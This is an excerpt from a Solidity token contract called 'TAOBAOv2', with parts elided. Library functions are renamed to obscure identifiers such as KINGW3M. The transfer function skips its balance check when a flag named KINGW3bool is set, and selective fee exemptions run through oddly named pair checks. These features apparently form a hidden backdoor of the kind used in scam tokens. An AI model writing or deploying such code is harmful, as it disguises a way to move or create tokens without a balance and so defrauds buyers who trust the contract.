...
library SafeMath {
    ...
    function KINGW3M(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "TAOBAOv2";
    string private _symbol = "TAOBAOv2";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (KINGW3bool){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.KINGW3derPair(to) && to != address(this) && !inLiquidityTransaction && !KINGW3bool) {
            feeAmount = amount.KINGW3M(_fee).div(taxdiv);
            if (to == uniswapV2Pair()) {
                feeAmount = amount.KINGW3M(_sellFee).div(taxdiv);
            }
    ...
    function KINGW3der2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.KINGW3derPair(to)) && to == from;
    }
